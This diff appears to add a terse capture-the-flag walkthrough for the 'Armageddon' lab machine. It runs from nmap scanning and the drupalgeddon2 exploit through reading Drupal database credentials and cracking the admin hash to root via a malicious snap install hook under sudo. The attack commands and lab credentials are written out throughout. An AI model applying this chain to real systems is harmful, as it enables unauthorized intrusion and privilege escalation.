@@ -1,0 +1,46 @@
+nmap -sV -sC -oA initial 10.10.10.233
+
+go to 80
+go to robots.txt
+go to README.txt
+see drupal 7.56
+searchsploit drupal 7.56
+machine name is Armageddon + drupal = drupalgeddon2
+
+msfconsole
+
+get shell as Apache
+cat /var/www/html/sites/default/settings.php
+'database' => 'drupal',
+'username' => 'drupaluser',
+'password' => 'CQHEy@9M*m23gBVj'
+
+mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -D drupal
+SELECT table_name FROM information_schema.tables;
+SELECT * FROM users;
+brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+
+john bruce-hash
+booboo
+
+brucetherealadmin@10.10.10.233
+
+sudo -l reveals snap
+https://gtfobins.github.io/gtfobins/snap/
+
+On kali:
+    install fpm
+    sudo apt-get install ruby ruby-dev rubygems build-essential
+    sudo gem install --no-document fpm
+
+    COMMAND='cat /root/root.txt'
+    cd $(mktemp -d)
+    mkdir -p meta/hooks
+    printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
+    chmod +x meta/hooks/install
+    fpm -n xxxx -s dir -t snap -a all meta
+
+    scp xxxx_1.0_all.snap brucetherealadmin@10.10.10.233:/home/brucetherealadmin/
+On target:
+    sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+
